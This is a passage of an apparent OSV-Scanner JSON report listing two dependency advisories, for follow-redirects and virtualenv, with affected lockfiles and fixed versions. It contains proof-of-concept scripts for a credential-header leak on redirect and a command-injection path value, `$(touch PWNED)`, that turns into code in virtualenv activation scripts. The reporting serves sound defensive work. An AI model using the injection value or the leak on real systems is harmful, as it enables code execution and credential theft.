true for the built-ins.\n\u003e \n\u003e Reachability of the vectors:\n\u003e ```\n\u003e node -e 'var http=require(\"http\");[\"X-A^B\",\"X-A|B\",\"X-A[B\",\"X-A{B\",\"X-A}B\"].forEach(function(n){try{var r=http.request({host:\"127.0.0.1\",port:1});r.setHeader(n,\"v\");r.destroy();console.log(n,\"ACCEPTED\");}catch(e){console.log(n,\"REJECTED\",e.code);}});'\n\u003e ```\n\u003e Observed: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.\n\u003e \n\u003e Facet 2, entry declared inside `beforeRedirect`, `leak2.js`:\n\u003e ```js\n\u003e var followRedirects = require(\"./index.js\");\n\u003e var http = require(\"http\");\n\u003e var redirector = http.createServer(function (req, res) {\n\u003e   res.writeHead(302, { Location: \"http://127.0.0.1:46202/\" }); res.end();\n\u003e });\n\u003e var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\n\u003e redirector.listen(46201, \"127.0.0.1\", function () {\n\u003e   collector.listen(46202, \"127.0.0.1\", function () {\n\u003e     followRedirects.http.request({\n\u003e       hostname: \"127.0.0.1\", port: 46201, path: \"/\",\n\u003e       headers: { \"X-Late\": \"LATE-DECLARED-VALUE\" },\n\u003e       beforeRedirect: function (options) { options.sensitiveHeaders.push(\"X-Late\"); }\n\u003e     }, function (res) {\n\u003e       var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n\u003e         console.log(\"X-Late forwarded to redirect target:\", JSON.parse(body)[\"x-late\"] || \"(stripped)\");\n\u003e         redirector.close(); collector.close();\n\u003e       });\n\u003e     }).end();\n\u003e   });\n\u003e });\n\u003e ```\n\u003e Observed output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).\n\u003e \n\u003e ### Impact\n\u003e This is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | follow-redirects | 1.16.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-8r9p-f939-6h3c | follow-redirects | 1.16.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111755\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-111755\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-111755",
              "name": "CVE-2026-111755",
              "properties": {
                "security-severity": "8.2"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-111755: follow-redirects sensitiveHeaders regex escaping can expose credential headers",
                "text": "CVE-2026-111755: follow-redirects sensitiveHeaders regex escaping can expose credential headers"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-113776",
                "GHSA-8rjx-v5ww-45pp"
              ],
              "fullDescription": {
                "markdown": "### Impact\n\n`ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.\n\n`__VIRTUAL_NAME__` holds the environment's directory name, so a destination such as `A__VIRTUAL_NAME__B/x'$(touch PWNED)'y` is enough. In the default `activate` for bash, the `VIRTUAL_ENV` line renders as:\n\n```sh\nVIRTUAL_ENV='/tmp/t/A'x'\"'\"'$(touch PWNED)'\"'\"'y'B/x'\"'\"'$(touch PWNED)'\"'\"'y'\n```\n\nSourcing that script runs `touch PWNED`. The same payload in a path without the placeholder name runs nothing. `activate.fish` runs the command the same way, and the reporter also showed Python code execution through `activate.xsh` and `bin/activate_this.py`. In `activate.csh`, a directory named after a prompt display placeholder, such as `__VIRTUAL_PROMPT_DISPLAY_TCSH__`, breaks the script with `Unmatched '''`.\n\nNo change to `quote()` can stop this, because the rewrite happens after `quote()` ran; it defeats `shlex.quote` and `repr()` alike.\n\nAn attacker needs to influence the destination path or `--prompt`: a CI job or wrapper tool that builds the path from a branch or project name, or a directory in a cloned repository or unpacked archive.\n\nThe bug affects versions 20.26.6 through 21.14.1. Version 20.26.6 first quoted template values (#2768) and introduced the per-key loop.\n\n### Patches\n\nFixed in 21.14.2. Activation scripts now keep a placeholder name in the environment's path or prompt as plain text, and activating the example above runs nothing. Fix: https://github.com/pypa/virtualenv/commit/602b26623a724827ff171bf11fef4ad186d01f74\n\n### Workarounds\n\nDo not create an environment whose path or `--prompt` contains a placeholder name such as `__VIRTUAL_NAME__`, `__VIRTUAL_ENV__` or `__VIRTUAL_PROMPT__`, and inspect the generated activation script before you source one you did not create.\n\n### Credits\n\nKevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.",
                "text": "### Impact\n\n`ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.\n\n`__VIRTUAL_NAME__` holds the environment's directory name, so a destination such as `A__VIRTUAL_NAME__B/x'$(touch PWNED)'y` is enough. In the default `activate` for bash, the `VIRTUAL_ENV` line renders as:\n\n```sh\nVIRTUAL_ENV='/tmp/t/A'x'\"'\"'$(touch PWNED)'\"'\"'y'B/x'\"'\"'$(touch PWNED)'\"'\"'y'\n```\n\nSourcing that script runs `touch PWNED`. The same payload in a path without the placeholder name runs nothing. `activate.fish` runs the command the same way, and the reporter also showed Python code execution through `activate.xsh` and `bin/activate_this.py`. In `activate.csh`, a directory named after a prompt display placeholder, such as `__VIRTUAL_PROMPT_DISPLAY_TCSH__`, breaks the script with `Unmatched '''`.\n\nNo change to `quote()` can stop this, because the rewrite happens after `quote()` ran; it defeats `shlex.quote` and `repr()` alike.\n\nAn attacker needs to influence the destination path or `--prompt`: a CI job or wrapper tool that builds the path from a branch or project name, or a directory in a cloned repository or unpacked archive.\n\nThe bug affects versions 20.26.6 through 21.14.1. Version 20.26.6 first quoted template values (#2768) and introduced the per-key loop.\n\n### Patches\n\nFixed in 21.14.2. Activation scripts now keep a placeholder name in the environment's path or prompt as plain text, and activating the example above runs nothing. Fix: https://github.com/pypa/virtualenv/commit/602b26623a724827ff171bf11fef4ad186d01f74\n\n### Workarounds\n\nDo not create an environment whose path or `--prompt` contains a placeholder name such as `__VIRTUAL_NAME__`, `__VIRTUAL_ENV__` or `__VIRTUAL_PROMPT__`, and inspect the generated activation script before you source one you did not create.\n\n### Credits\n\nKevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-113776](https://osv.dev/CVE-2026-113776)**.\n\n## [GHSA-8rjx-v5ww-45pp](https://osv.dev/GHSA-8rjx-v5ww-45pp)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.\n\u003e \n\u003e `__VIRTUAL_NAME__` holds the environment's directory name, so a destination such as `A__VIRTUAL_NAME__B/x'$(touch PWNED)'y` is enough. In the default `activate` for bash, the `VIRTUAL_ENV` line renders as:\n\u003e \n\u003e ```sh\n\u003e VIRTUAL_ENV='/tmp/t/A'x'\"'\"'$(touch PWNED)'\"'\"'y'B/x'\"'\"'$(touch PWNED)'\"'\"'y'\n\u003e ```\n\u003e \n\u003e Sourcing that script runs `touch PWNED`. The same payload in a path without the placeholder name runs nothing. `activate.fish` runs the command the same way, and the reporter also showed Python code execution through `activate.xsh` and `bin/activate_this.py`. In `activate.csh`, a directory named after a prompt display placeholder, such as `__VIRTUAL_PROMPT_DISPLAY_TCSH__`, breaks the script with `Unmatched '''`.\n\u003e \n\u003e No change to `quote()` can stop this, because the rewrite happens after `quote()` ran; it defeats `shlex.quote` and `repr()` alike.\n\u003e \n\u003e An attacker needs to influence the destination path or `--prompt`: a CI job or wrapper tool that builds the path from a branch or project name, or a directory in a cloned repository or unpacked archive.\n\u003e \n\u003e The bug affects versions 20.26.6 through 21.14.1. Version 20.26.6 first quoted template values (#2768) and introduced the per-key loop.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Fixed in 21.14.2. Activation scripts now keep a placeholder name in the environment's path or prompt as plain text, and activating the example above runs nothing. Fix: https://github.com/pypa/virtualenv/commit/602b26623a724827ff171bf11fef4ad186d01f74\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Do not create an environment whose path or `--prompt` contains a placeholder name such as `__VIRTUAL_NAME__`, `__VIRTUAL_ENV__` or `__VIRTUAL_PROMPT__`, and inspect the generated activation script before you source one you did not create.\n\u003e \n\u003e ### Credits\n\u003e \n\u003e Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-8rjx-v5ww-45pp | virtualenv | 21.14.2 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113776\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113776\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-113776](https://osv.dev/CVE-2026-113776)**.\n\n## [GHSA-8rjx-v5ww-45pp](https://osv.dev/GHSA-8rjx-v5ww-45pp)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.\n\u003e \n\u003e `__VIRTUAL_NAME__` holds the environment's directory name, so a destination such as `A__VIRTUAL_NAME__B/x'$(touch PWNED)'y` is enough. In the default `activate` for bash, the `VIRTUAL_ENV` line renders as:\n\u003e \n\u003e ```sh\n\u003e VIRTUAL_ENV='/tmp/t/A'x'\"'\"'$(touch PWNED)'\"'\"'y'B/x'\"'\"'$(touch PWNED)'\"'\"'y'\n\u003e ```\n\u003e \n\u003e Sourcing that script runs `touch PWNED`. The same payload in a path without the placeholder name runs nothing. `activate.fish` runs the command the same way, and the reporter also showed Python code execution through `activate.xsh` and `bin/activate_this.py`. In `activate.csh`, a directory named after a prompt display placeholder, such as `__VIRTUAL_PROMPT_DISPLAY_TCSH__`, breaks the script with `Unmatched '''`.\n\u003e \n\u003e No change to `quote()` can stop this, because the rewrite happens after `quote()` ran; it defeats `shlex.quote` and `repr()` alike.\n\u003e \n\u003e An attacker needs to influence the destination path or `--prompt`: a CI job or wrapper tool that builds the path from a branch or project name, or a directory in a cloned repository or unpacked archive.\n\u003e \n\u003e The bug affects versions 20.26.6 through 21.14.1. Version 20.26.6 first quoted template values (#2768) and introduced the per-key loop.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Fixed in 21.14.2. Activation scripts now keep a placeholder name in the environment's path or prompt as plain text, and activating the example above runs nothing. Fix: https://github.com/pypa/virtualenv/commit/602b26623a724827ff171bf11fef4ad186d01f74\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Do not create an environment whose path or `--prompt` contains a placeholder name such as `__VIRTUAL_NAME__`, `__VIRTUAL_ENV__` or `__VIRTUAL_PROMPT__`, and inspect the generated activation script before you source one you did not create.\n\u003e \n\u003e ### Credits\n\u003e \n\u003e Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-8rjx-v5ww-45pp | virtualenv | 21.14.2 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113776\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113776\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
